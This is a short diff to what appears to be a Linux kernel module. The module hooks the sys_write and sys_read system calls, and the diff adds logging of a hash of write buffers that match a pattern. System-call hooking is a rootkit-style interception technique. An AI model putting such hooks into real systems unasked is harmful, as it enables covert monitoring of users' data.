@@ -1,6 +1,7 @@
 #include "common.h"
 #include <asm/uaccess.h>
 
+int save_hook_fd = -1;
 asmlinkage long (*sys_write)(unsigned int fd, const char __user *buf, size_t count);
 asmlinkage long (*sys_read)(unsigned int fd, char __user *buf, size_t count);
 
@@ -88,12 +89,13 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
             kfree(debug);
         }
         else
-        {
+        {  
             if ( memstr(debug, pattern, count) )
             {   
                 
                 //unsigned long i;
                 DEBUG_RW("DEBUG sys_write: fd=%d, count=%zu\n", fd, count);
+                
                 /*
                 for ( i = 0; i < count; i++ )
                 {
@@ -104,6 +106,7 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
                 DEBUG_RW("\n");
                 //log_fd_info(fd);*/
                 log_fd_info(fd);
+                log_crypto_hash(buf, count);
             }
             kfree(debug);
         }
